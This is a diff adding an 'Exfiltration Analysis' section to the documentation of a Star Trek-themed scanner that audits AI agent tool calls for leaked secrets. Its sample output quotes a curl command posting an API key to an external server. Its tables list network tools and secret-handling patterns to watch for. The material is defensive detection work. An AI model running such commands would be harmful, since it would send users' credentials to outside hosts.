@@ -374,6 +374,71 @@ Not just regex — find things that **look like** secrets:
 - Comments with "TODO: remove before commit"
 - Test fixtures with real-looking data
 
+## Exfiltration Analysis
+
+Detect when sensitive data might be **leaving** via tool calls.
+
+> *"Captain, sensors detecting unauthorized subspace transmissions!"*
+
+### EXFILTRATION-SCAN
+Analyze tool call arguments for data leaving patterns:
+
+```bash
+trekify EXFILTRATION-SCAN e8587ace
+
+# EXFILTRATION ANALYSIS
+# =====================
+# Subspace transmissions detected: 3
+#
+# [CRITICAL] Tool: Shell, Line 423
+#   Command: curl -X POST https://api.external.com -d "key=$API_KEY"
+#   Risk: Credentials sent to external server
+#
+# [HIGH] Tool: Write, Line 156
+#   Path: /tmp/debug-output.txt
+#   Content contains: password=...
+#   Risk: Secrets written to world-readable location
+#
+# [MEDIUM] Tool: Shell, Line 89
+#   Command: echo $DATABASE_URL
+#   Risk: Connection string exposed in terminal
+```
+
+### What Exfiltration Analysis Detects
+
+| Category | Patterns | Risk |
+|----------|----------|------|
+| **Network** | curl, wget, fetch with credentials | Data sent externally |
+| **API calls** | API keys in URLs, auth headers | Credentials exposed |
+| **File ops** | Write to /tmp, cloud sync folders | Data in risky locations |
+| **Clipboard** | pbcopy, xclip with secrets | Data accessible via paste |
+| **Environment** | export PASSWORD=, echo $SECRET | Secrets in process env |
+| **Logging** | print(password), console.log(secret) | Secrets in log files |
+| **Database** | INSERT with credentials | Credentials stored |
+| **Email** | smtp with password, mailto with secrets | Plaintext transmission |
+
+### TOOL-AUDIT
+Comprehensive audit of all tool calls in a session:
+
+```bash
+trekify TOOL-AUDIT e8587ace --tools Shell,Write
+
+# TIMELINE OF RISKY OPERATIONS:
+# 14:23:05 [HIGH] Shell: curl with embedded credential
+# 14:24:12 [MEDIUM] Write: /tmp/debug.log with password
+# 14:25:33 [HIGH] Shell: export SECRET_KEY=...
+# 14:26:01 [MEDIUM] Write: config.json with API key
+# 14:27:45 [CRITICAL] Shell: scp to external server
+```
+
+### High-Risk Tools to Watch
+
+| Tool | Watch For |
+|------|-----------|
+| **Shell** | curl, wget, nc, scp, rsync, mail, echo $SECRET |
+| **Write** | Paths outside workspace, /tmp/, cloud sync folders |
+| **browser_navigate** | API keys in URLs, tokens in query strings |
+
 ## Example Transformations
 
 ### Log Entry
